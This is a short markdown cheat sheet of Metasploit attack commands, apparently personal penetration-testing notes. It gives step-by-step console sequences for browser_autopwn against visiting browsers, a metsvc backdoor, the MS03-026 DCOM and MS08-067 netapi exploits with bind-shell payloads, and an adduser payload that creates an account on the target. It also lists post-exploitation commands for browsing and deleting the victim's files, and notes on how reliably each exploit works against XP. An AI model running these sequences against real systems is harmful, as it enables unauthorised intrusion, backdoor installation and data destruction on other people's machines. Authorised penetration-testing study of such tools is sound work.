Metasploit Exploits cheats
==========================

#### Usage

	$ msfconsole     # starts metasploit
	$ msfupdate      # updates metasploit
	run + two tabs   # lists all meterpreter scripts


#### browser autopwn

Victim needs to visit [IP_ADDRESS]

	msf> use auxiliary/server/browser_autopwn
	msf> set LHOST [LOCALHOST]
	msf> set SRVPORT 80
	msf> set URIPATH /
	msf> run


#### metsvc exploit

Less noisy than persistance exploit

	msf> use exploit/multi/handler
	msf> set PAYLOAD windows/metsvc_bind_tcp
	msf> exploit

Post exploit:

	run metsvc -r     # removes the service; also remove metsrv.dll, metsvc-server.exe, metsvc.exe 


#### ms03 exploit

did not work on service pack 3

	msf> use exploit/windows/dcerpc/ms03_026_dcom
	msf> set RHOST [TARGET]
	msf> set PAYLOAD windows/shell_bind_tcp #binds shell on victims tcp port
	msf> show options
	msf> exploit


#### netapi exploit

Works almost all of the time on XP
Opens shell session

	msf> use exploit/windows/smb/ms08_067_netapi 
	msf> set RHOST [TARGET]
	msf> set PAYLOAD windows/shell_bind_tcp
	msf> set LPORT 6000
	msf> show options
	msf> exploit

Post exploit:

	netstat -n    # run on victim will show the connection
	dir           # lists all files on directory
	del           # delete a file on the victim


#### netapi exploit - adduser

works on XP almost all of the time

	msf> use exploit/windows/smb/ms08_067_netapi 
	msf> set RHOST [TARGET]
	msf> set PAYLOAD windows/adduser
	msf> set LPORT 6000
	msf> set USER [USERNAME]
	msf> set PASS [PASSWORD]
	msf> show options
	msf> exploit
